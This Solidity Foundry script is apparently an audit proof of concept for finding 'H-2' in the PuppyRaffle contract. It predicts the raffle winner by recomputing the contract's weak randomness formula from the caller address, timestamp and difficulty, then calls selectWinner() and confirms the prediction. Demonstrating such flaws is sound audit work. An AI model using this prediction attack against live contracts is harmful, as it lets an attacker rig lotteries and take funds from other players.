// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Script, console} from "forge-std/Script.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

/// @notice H-2 PRNG Prediction Demo.
/// Proves the PRNG is predictable by computing the winner BEFORE calling selectWinner(),
/// using the exact same formula the contract uses — with live Anvil block values.
/// No timestamp manipulation needed: prediction works on the current block as-is.
contract AttackPRNG is Script {
    function run(address puppyRaffleAddress) external {
        uint256 callerPrivateKey = vm.envUint("ATTACKER_KEY");
        address callerEOA = vm.addr(callerPrivateKey);
        PuppyRaffle raffle = PuppyRaffle(puppyRaffleAddress);

        // Step 1: Predict the winner BEFORE calling selectWinner
        // Use the exact same formula as PuppyRaffle.sol#L128-129
        uint256 predictedIndex =
            uint256(keccak256(abi.encodePacked(callerEOA, block.timestamp, block.difficulty)))
            % 4;
        address predictedWinner = raffle.players(predictedIndex);

        console.log("=== H-2: PRNG PREDICTION (before selectWinner is called) ===");
        console.log("Caller (msg.sender) :", callerEOA);
        console.log("Predicted winner    :", predictedWinner);
        console.log("Predicted slot index: (check logs)");

        // Step 2: Call selectWinner — winner is already known
        vm.startBroadcast(callerPrivateKey);
        raffle.selectWinner();
        vm.stopBroadcast();

        // Step 3: Verify prediction was correct
        address actualWinner = raffle.previousWinner();
        console.log("=== RESULT (after selectWinner executed) ===");
        console.log("Actual winner on-chain:", actualWinner);
        console.log("Prediction was correct:", actualWinner == predictedWinner);
    }
}
